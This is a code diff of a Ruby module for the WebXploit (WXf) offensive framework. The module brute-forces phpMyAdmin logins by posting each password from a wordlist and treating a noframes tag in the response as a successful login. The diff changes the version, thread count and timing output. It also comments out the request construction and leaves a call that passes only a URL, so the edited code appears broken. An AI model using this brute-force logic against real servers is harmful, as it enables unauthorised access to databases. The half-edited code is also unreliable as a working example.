@@ -10,7 +10,7 @@ class WebXploit < WXf::WXfmod_Factory::Auxiliary
   def initialize
       super(
         'Name'        => 'phpMyAdmin Auth Bruteforce',
-        'Version'     => '1.0',
+        'Version'     => '1.1',
         'Description' => %q{
           Bruteforce authentication for phpMyAdmin                 },
         'Author'      => ['John Poulin' ],
@@ -28,8 +28,9 @@ class WebXploit < WXf::WXfmod_Factory::Auxiliary
   end
   
   def run
+	puts "Starting: #{puts Time.new.localtime}"
 	# Create threadpool
-	pool = Pool.pool(size: 100)
+	pool = Pool.pool(size: 64)
 
 	username = datahash['USERNAME']
 
@@ -37,7 +38,8 @@ class WebXploit < WXf::WXfmod_Factory::Auxiliary
 	fname = datahash['PASSLIST']
 	file = File.new(fname, "r")
 
-	response_action = Proc.new { |res,request_params, args |
+
+	response_action = Proc.new { |res,request_params,args |
 		username = args[0]
 		password = args[1]
 
@@ -46,6 +48,7 @@ class WebXploit < WXf::WXfmod_Factory::Auxiliary
 		frames = res.body.scan(/\<noframes\>(.*?)\<\/noframes\>/m)
 		
 		if frames.count > 0
+			puts Time.new.localtime
 			print_good("#{username} : #{password}")
 			break
 		else
@@ -54,9 +57,12 @@ class WebXploit < WXf::WXfmod_Factory::Auxiliary
 			end
 		end	
 	}
-
+	i = 0
+	# Create Request Proc
+	#req = Proc.new { |opts| mech_req(opts)}
 	# Iterate over file contents
 	while (password = file.gets)
+=begin
 		params = "pma_username=#{username}&pma_password=#{password}&server=1"
 		options = {
             'method' => "POST",
@@ -64,36 +70,12 @@ class WebXploit < WXf::WXfmod_Factory::Auxiliary
             'RPARAMS' => params,
 			'HEADERS' => {'Content-Type' => "application/x-www-form-urlencoded"}
           }
-
-		pool.future.get(Proc.new {|opts| mech_req(opts)}, options, response_action, username, password) 
-
-=begin
-		params = "pma_username=#{username}&pma_password=#{password}&server=1"
-		
-		res = mech_req({
-            'method' => "POST",
-            'RURL'=> rurl + "/" + datahash['DIR'] + "/index.php",
-            'RPARAMS' => params,
-			'HEADERS' => {'Content-Type' => "application/x-www-form-urlencoded"}
-          })
-
-		
-		# Scan request for <noframes></noframes>
-		# This appears in the source of a successfully authenticated session
-		frames = res.body.scan(/\<noframes\>(.*?)\<\/noframes\>/m)
-		
-		if frames.count > 0
-			print_good("#{username} : #{password}")
-			break
-		else
-			if datahash['VERBOSE'] == "true"
-				print_error("#{username} : #{password}")
-			end
-		end	
-
 =end
+		#pool.future.get(Proc.new {|opts| mech_req(opts)}, options, response_action, username, password)
+		#pool.future.get(req, options, response_action, username, password) 
+		#pool.future.get(req, options, username, password)
+		pool.future.get(rurl + "/" + datahash['DIR'] + "/index.php")
 	end
-	
   end
   
 end
